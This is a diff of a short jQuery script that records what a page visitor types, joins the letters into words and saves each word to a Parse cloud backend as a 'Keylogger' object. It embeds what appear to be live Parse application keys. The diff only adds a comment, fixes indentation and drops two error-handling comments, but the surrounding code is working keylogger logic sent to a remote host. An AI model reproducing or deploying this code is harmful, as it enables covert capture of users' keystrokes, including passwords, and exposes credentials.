@@ -10,6 +10,7 @@ $(document).ready(function(){
     var wordArray = [];
     var lettersTyped = 0;
     var currentWord = '';
+    // Place your Parse project keys on the line after this
     Parse.initialize("I727vHwPf3qBNX6fEoy1X4nPCbzixCy9NoWMGXZQ", "1f22sRsB0gYTfd49lobej7raEYL4Nc5ViCOjB8Ue");
     var Keylogger = Parse.Object.extend("Keylogger");
     $(document).click(function() {
@@ -34,7 +35,7 @@ $(document).ready(function(){
     });
     $(document).keyup(function(event){ 
         if (event.which === 32) {
-                var currentKeylogger = new Keylogger();
+            var currentKeylogger = new Keylogger();
 
             currentWord = wordArray.join('');
             
@@ -46,8 +47,6 @@ $(document).ready(function(){
       
   },
   error: function(currentKeylogger, error) {
-    // Execute any logic that should take place if the save fails.
-    // error is a Parse.Error with an error code and message.
   }
 });
             console.log(currentWord);
